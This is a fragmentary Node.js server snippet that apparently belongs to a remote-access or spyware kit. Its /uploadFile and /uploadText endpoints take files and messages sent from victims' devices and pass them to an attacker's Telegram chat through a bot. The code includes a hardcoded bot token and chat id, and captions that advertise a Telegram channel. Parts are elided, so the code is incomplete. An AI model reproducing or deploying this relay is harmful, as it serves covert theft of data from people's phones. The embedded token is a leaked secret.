...
const token = '7019269350:AAFx6b74fiYUFb8uN_-qwgYCrQFD-i7a59s'
const id = '7187829837'
...
app.post("/uploadFile", upload.single('file'), (req, res) => {
    ...
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚  <b> </b> <b> </b> Dont forget to join our community 😇 👉 @jujutsukaisenaimbot 👈 🤩`,
            parse_mode: "HTML"
        },
        {
            filename: name,
...
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n <b> </b> <b> </b> Dont forget to join our community 😇 👉 @jujutsukaisenaimbot 👈 🤩`, {parse_mode: "HTML"})
    res.send('')
})
